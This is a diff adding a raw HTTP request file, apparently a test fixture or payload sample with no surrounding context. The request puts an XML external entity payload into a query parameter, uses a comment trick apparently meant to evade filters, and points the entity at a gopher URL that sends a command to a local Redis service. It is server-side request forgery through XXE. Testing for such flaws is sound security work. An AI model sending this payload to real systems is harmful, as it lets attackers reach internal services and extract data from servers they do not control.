@@ -1,0 +1,4 @@
+GET /a?data=<!/*x*/DOCTYPE%20r%20[<!ENTITY%20x%20SYSTEM%20"gopher://127.0.0.1:6379/_INFO">]><r>%26x;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
